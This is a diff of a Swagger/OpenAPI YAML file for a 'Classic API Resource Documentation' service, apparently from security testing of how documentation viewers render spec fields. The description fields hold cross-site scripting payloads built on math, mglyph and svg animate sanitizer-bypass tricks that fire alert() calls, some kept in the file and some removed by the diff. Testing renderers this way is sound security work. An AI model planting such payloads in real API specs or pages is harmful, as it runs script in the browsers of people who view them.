@@ -3,27 +3,7 @@ info:
   title: Classic API Resource Documentation
   description: <form><math><h1>BU0</h1><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
     onbegin="alert('XSS1')"/><mtext><h1>BU1</h1><textarea><desc id="</textarea><math><mtext><h1>BU</h1>">
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
-paths:
-  /accounts:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - accounts"><img/src=x onmouseenter="alert('Test XSS1')">
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/accounts/groupid/{id}':
+
   version: production
 basePath: /test-c4sper0
 security:
@@ -33,8 +13,7 @@ paths:
     get:
       responses:
         '200':
-          description: <form><math><mtext></form><form><mglyph><svg><animate attributeName="opacity" from="0" to="1" begin="0s" dur="0.1s" fill="freeze" 
-    onbegin="alert('XSS2')"/><mtext><textarea><path id="</textarea><xss onmouseenter="alert('Test XSS2')" style=display:block>test</xss>"></form>
+          description: No response was specified
       tags:
         - accounts
       operationId: findAccounts
